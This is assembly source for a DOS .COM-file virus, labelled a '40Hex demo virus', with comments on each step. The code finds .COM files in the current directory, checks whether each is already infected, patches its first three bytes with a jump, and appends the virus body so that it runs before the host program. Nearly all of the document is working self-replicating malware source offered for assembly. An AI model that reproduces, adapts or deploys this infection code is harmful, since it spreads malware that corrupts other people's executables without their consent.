  DumbVirus segment
  Assume    CS:DumbVirus
  Org 100h                 ; account for PSP
  
  ; Dumb Virus - 40Hex demo virus
  ; Assemble with TASM /m2
  
  Start:  db      0e9h     ; jmp duh
          dw      0
  
  ; This is where the virus starts
  duh:    call    next
  next:   pop     bp                   ; bp holds current location
          sub     bp, offset next      ; calculate net change
  
  ; Restore the original first three bytes
          lea     si, [bp+offset stuff]
          mov     di, 100h
  ; Put 100h on the stack for the retn later
  ; This will allow for the return to the beginning of the file
          push    di
          movsw
          movsb
  
  ; Change DTA from default (otherwise Findfirst/next will destroy
  ; commandline parametres
          lea     dx, [bp+offset dta]
          call    set_dta
  
          mov     ah, 4eh           ; Find first
          lea     dx, [bp+masker]   ; search for '*.COM',0
          xor     cx, cx            ; attribute mask - this is unnecessary
  tryanother:
          int     21h
          jc      quit              ; Quit on error
  
  ; Open file for read/write
  ; Note: This fails on read-only files
          mov     ax, 3D02h
          lea     dx, [bp+offset dta+30] ; File name is located in DTA
          int     21h
          xchg    ax, bx
  
  ; Read in the first three bytes
          mov     ah, 3fh
          lea     dx, [bp+stuff]
          mov     cx, 3
          int     21h
  
  ; Check for previous infection
          mov     ax, word ptr [bp+dta+26]       ; ax = filesize
          mov     cx, word ptr [bp+stuff+1]      ; jmp location
          add     cx, eov - duh + 3              ; convert to filesize
          cmp     ax, cx                         ; if same, already infected
          jz      close                          ; so quit out of here
  
  ; Calculate the offset of the jmp
          sub     ax, 3                          ; ax = filesize - 3
          mov     word ptr [bp+writebuffer], ax
  
  ; Go to the beginning of the file
          xor     al, al
          call    f_ptr
  
  ; Write the three bytes
          mov     ah, 40h
          mov     cx, 3
          lea     dx, [bp+e9]
          int     21h
  
  ; Go to the end of the file
          mov     al, 2
          call    f_ptr
  
  ; And write the rest of the virus
          mov     ah, 40h
          mov     cx, eov - duh
          lea     dx, [bp+duh]
          int     21h
  
  close:
          mov     ah, 3eh
          int     21h
  
  ; Try infecting another file
          mov     ah, 4fh                        ; Find next
          jmp     short tryanother
  
  ; Restore the DTA and return control to the original program
  quit:   mov     dx, 80h                        ; Restore current DTA to
                                                 ; the default @ PSP:80h
  set_dta:
          mov     ah, 1ah                        ; Set disk transfer address
          int     21h
          retn
  f_ptr:  mov     ah, 42h
          xor     cx, cx
          cwd                                    ; equivalent to: xor dx, dx
          int     21h
          retn
  
  masker  db      '*.com',0
  ; Original three bytes of the infected file
  ; Currently holds a INT 20h instruction and a null byte
  stuff   db      0cdh, 20h, 0
  e9      db      0e9h
  eov equ $                                      ; End of the virus
  ; The following variables are stored in the heap space (the area between
  ; the stack and the code) and are not part of the virus that is written
  ; to files.
  writebuffer dw  ?                              ; Scratch area holding the
                                                 ; JMP offset
  dta         db 42 dup (?)
  DumbVirus    ENDS
               END     Start

